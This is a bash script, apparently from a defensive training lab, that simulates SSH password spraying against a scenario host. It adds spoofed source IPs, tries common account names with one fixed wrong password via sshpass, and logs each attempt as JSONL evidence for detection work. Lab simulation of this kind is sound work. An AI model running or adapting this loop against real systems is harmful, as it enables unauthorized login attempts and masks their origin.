#!/bin/bash

set -euo pipefail

VICTIM_IP="${1:-scenario_victim}"
VICTIM_PORT="${2:-2222}"
LOG_DIR="${NOVADEF_LOG_DIR:-/var/novadef/logs}"
OUTPUT_FILE="${LOG_DIR}/password_spraying_attempts.jsonl"
SLEEP_SECONDS="${SLEEP_SECONDS:-1}"

mkdir -p "${LOG_DIR}"
: > "${OUTPUT_FILE}"

resolved_victim_ip="$(getent ahostsv4 "${VICTIM_IP}" | awk 'NR==1 {print $1}')"
if [ -n "${resolved_victim_ip}" ]; then
  VICTIM_TARGET="${resolved_victim_ip}"
else
  VICTIM_TARGET="${VICTIM_IP}"
fi

SOURCE_IPS=(
  "172.18.0.50"
  "172.18.0.51"
  "172.18.0.52"
  "172.18.0.53"
  "172.18.0.54"
)

TARGET_USERS=(
  "admin"
  "root"
  "administrator"
  "backup"
  "monitoring"
  "support"
  "sales"
  "marketing"
  "finance"
  "developer"
  "devops"
  "jenkins"
  "user"
  "guest"
  "test"
)

iface="$(ip route get "${VICTIM_TARGET}" | awk '/dev/ {for (i = 1; i <= NF; i++) if ($i == "dev") {print $(i+1); exit}}')"
if [ -z "${iface}" ]; then
  echo "No se pudo determinar la interfaz hacia ${VICTIM_TARGET}" >&2
  exit 1
fi

for src_ip in "${SOURCE_IPS[@]}"; do
  if ! ip addr show dev "${iface}" | grep -q "${src_ip}"; then
    ip addr add "${src_ip}/16" dev "${iface}" 2>/dev/null || true
  fi
done

for target_user in "${TARGET_USERS[@]}"; do
  for src_ip in "${SOURCE_IPS[@]}"; do
    sshpass -p "WrongPassword!123" ssh \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=5 \
      -p "${VICTIM_PORT}" \
      -b "${src_ip}" \
      "${target_user}@${VICTIM_TARGET}" "true" >/dev/null 2>&1 || true

    printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"timestamp":%s}\n' \
      "${src_ip}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${target_user}" "$(date +%s.%3N)" >> "${OUTPUT_FILE}"

    sleep "${SLEEP_SECONDS}"
  done
done

echo "Password spraying completado. Evidencia: ${OUTPUT_FILE}"
